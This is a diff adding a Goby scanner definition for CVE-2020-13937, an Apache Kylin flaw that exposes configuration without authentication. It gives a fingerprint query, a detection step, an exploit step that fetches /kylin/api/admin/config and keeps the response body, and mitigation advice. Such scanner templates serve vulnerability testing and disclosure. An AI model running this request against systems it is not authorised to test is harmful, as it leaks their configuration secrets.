@@ -1,0 +1,98 @@
+{
+      "Name": "Apache Kylin Unauthorized configuration disclosure (CVE-2020-13937)",
+      "Level": "0",
+      "Tags": [
+            "Disclosure of Sensitive Information"
+      ],
+      "GobyQuery": "app=\"APACHE-kylin\"",
+      "Description": "Apache kylin has a restful API that exposes configuration information without authorization.\nAttackers can use this vulnerability to obtain sensitive information of the system.",
+      "Product": "Apache kylin",
+      "Homepage": "http://kylin.apache.org/",
+      "Author": "PeiQi",
+      "Impact": "<p>Attackers can use this vulnerability to obtain sensitive information of the system.<br></p>",
+      "Recommandation": "<p>Upgrade to the safe version, or perform the following mitigation measures:</p><p>Edit \"$kylin\"_ HOME/WEB-INF/classes/ kylinSecurity.xml \"；</p><p>Delete the following line \"&lt; scr:intercept-url pattern= \"/api/admin/config\" access=\"permitAll\"/&gt;\"；</p><p>Restart the kylin instance to take effect.</p>",
+      "References": [
+            "http://wiki.peiqi.tech"
+      ],
+	  "HasExp": true,
+	  "ExpParams": [
+		{
+			"name": "Config",
+			"type": "select",
+			"value": "/kylin/api/admin/config",
+			"show": ""
+		}
+	  ],
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/kylin/api/admin/config",
+                        "follow_redirect": true,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "config",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+	  "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/kylin/api/admin/config",
+                        "follow_redirect": true,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+				  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "config",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+					"output|lastbody"
+				  ]
+            }
+      ],
+      "PostTime": "2021-04-04 15:55:28",
+      "GobyVersion": "1.8.255"
+}
